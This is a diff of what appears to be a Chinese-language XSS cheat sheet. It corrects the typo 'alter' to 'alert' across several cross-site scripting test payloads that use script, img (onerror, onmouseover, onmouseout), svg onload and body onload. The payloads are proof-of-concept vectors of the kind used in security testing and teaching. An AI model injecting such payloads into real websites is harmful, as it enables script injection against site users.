@@ -12,13 +12,13 @@ date: 2021-12-11 10:00:00
 ## 标准语句
 
 ```html
-<script>alter(xss)</script>
+<script>alert(xss)</script>
 ```
 
 ## 尝试大小写
 
 ```html
-<sCript>alter(1)</sCRipt>
+<sCript>alert(1)</sCRipt>
 ```
 
 ## 使用`<img>`标签
@@ -26,14 +26,14 @@ date: 2021-12-11 10:00:00
 ```html
 - windows事件
 <img src="x" onerror=alert(1)>
-<img src="1" onerror=eval("alter('xss')")>
+<img src="1" onerror=eval("alert('xss')")>
 //图片加载错误时触发
 
 
 - 鼠标事件
-<img src=1 onmouseover="alter(1)">
+<img src=1 onmouseover="alert(1)">
 //鼠标指针移动到元素时触发
-<img src=1 onmouseout="alter(1)">
+<img src=1 onmouseout="alert(1)">
 //鼠标指针移出时触发
 ```
 
@@ -87,13 +87,13 @@ date: 2021-12-11 10:00:00
 ## 使用`<svg>`标签
 
 ```html
-<svg onload=alter(1)>
+<svg onload=alert(1)>
 ```
 
 ## 使用`<body>`标签
 
 ```html
-<body onload="alter(1)">
+<body onload="alert(1)">
 //加载时触发
 ```
 
